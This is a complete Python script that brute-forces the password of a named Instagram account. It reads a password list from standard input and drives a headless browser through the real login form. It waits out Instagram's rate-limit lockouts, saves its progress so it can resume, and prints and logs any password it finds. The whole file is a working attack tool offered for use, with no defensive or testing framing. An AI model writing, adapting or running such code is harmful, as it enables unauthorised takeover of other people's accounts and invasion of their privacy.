#!/bin/python
import importlib
import subprocess
import sys
import time
import logging
from tqdm import tqdm
import os

# List of required packages
required_packages = ['splinter', 'tqdm']

# Function to install missing packages
def install(package):
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

# Check for required packages and install if missing
for package in required_packages:
    try:
        importlib.import_module(package)
    except ImportError:
        print(f"Installing missing package: {package}")
        install(package)

# Restart the script if any packages were installed
if any(not importlib.util.find_spec(package) for package in required_packages):
    print("Some packages were missing and have been installed. Restarting the script...")
    subprocess.Popen([sys.executable] + sys.argv)
    sys.exit()

# Now import the necessary modules
from splinter import Browser

# Configure logging
logging.basicConfig(filename='login_attempts.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Constants
DEFAULT_WAIT_TIME = 11 * 60 + 35  # 11 minutes and 35 seconds
problem_logging_in = "There was a problem logging you into Instagram. Please try again soon."
MAX_RETRIES = 5
STATE_FILE = "last_attempt.txt"

# Function to check login success
def logInSuccess(browser):
    user_err_msg = "The username you entered doesn't belong to an account. Please check your username and try again."
    pass_err_msg = "Sorry, your password was incorrect. Please double-check your password."
    return not (browser.is_text_present(user_err_msg) or browser.is_text_present(pass_err_msg))

# Function to display available browsers
def display_browser_options():
    print("Choose a browser:")
    print("1. Firefox")
    print("2. Chrome")
    print("3. Edge")
    print("4. Safari")
    print("5. Opera")
    choice = input("Enter the number corresponding to your choice: ")
    browser_options = {
        '1': 'firefox',
        '2': 'chrome',
        '3': 'edge',
        '4': 'safari',
        '5': 'opera'
    }
    return browser_options.get(choice, 'firefox')  # Default to Firefox if invalid choice

# Function to check password strength
def check_password_strength(password):
    if len(password) < 8:
        return "weak"
    elif len(password) < 12:
        return "medium"
    else:
        return "strong"

# Function to load the last attempted password
def load_last_attempt():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, 'r') as f:
            return f.read().strip()
    return None

# Function to save the last attempted password
def save_last_attempt(password):
    with open(STATE_FILE, 'w') as f:
        f.write(password)

# Get command line arguments
if len(sys.argv) < 2:
    print("Usage: python script.py <username> [timeout_seconds]")
    sys.exit(1)

account_username = sys.argv[1]
timeout_duration = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_WAIT_TIME
browser_choice = display_browser_options()

# Initialize variables
correctPassword = None
password_count = 0
attempts = 0
retry_count = 0
last_attempted_password = load_last_attempt()

# Read passwords from stdin
passwords = sys.stdin.read().strip().splitlines()
if last_attempted_password:
    try:
        start_index = passwords.index(last_attempted_password) + 1
        passwords = passwords[start_index:]  # Resume from the last attempted password
    except ValueError:
        print("Last attempted password not found in the list. Starting from the beginning.")

# Start the login process
with Browser(browser_choice, headless=True) as browser:
    browser.visit('https://www.instagram.com')
    browser.find_by_text("Log in").first.click()
    username_form = browser.find_by_name('username').first
    password_form = browser.find_by_name('password').first
    login_button = browser.find_by_text('Log in').first
    username_form.fill(account_username)

    total_passwords = len(passwords)

    for password in tqdm(passwords, desc="Testing passwords"):
        password = password.strip()  # Remove any leading/trailing whitespace
        if len(password) < 6:
            print(f'Skipping password: {password}')
            continue

        strength = check_password_strength(password)
        logging.info(f'Testing password: {password} (Strength: {strength})')
        
        password_form.clear()
        password_form.fill(password)
        login_button.click()
        attempts += 1

        if browser.is_text_present(problem_logging_in):
            print('Waiting for timeout to end...')
            save_last_attempt(password)  # Save the last attempted password
            
            retry_count += 1
            
            if retry_count >= MAX_RETRIES:
                print("Maximum retry limit reached. Exiting.")
                break
            
            for remaining_time in range(timeout_duration, 0, -1):
                minutes, seconds = divmod(remaining_time, 60)
                print(f'Timeout remaining: {minutes:02}:{seconds:02}', end='\r')
                time.sleep(1)
            print('\nTimeout has ended, resuming.')
        elif logInSuccess(browser):
            correctPassword = password
            break
        
        password_count += 1
        print(f'Attempted passwords: {password_count}, Total attempts: {attempts}')

    if correctPassword is None:
        print("Unable to find correct password.")
    else:
        print(f"Password for username: {account_username} = {correctPassword}")
        logging.info(f"Password found: {correctPassword}")

# Clean up the state file after successful login
if correctPassword:
    os.remove(STATE_FILE)
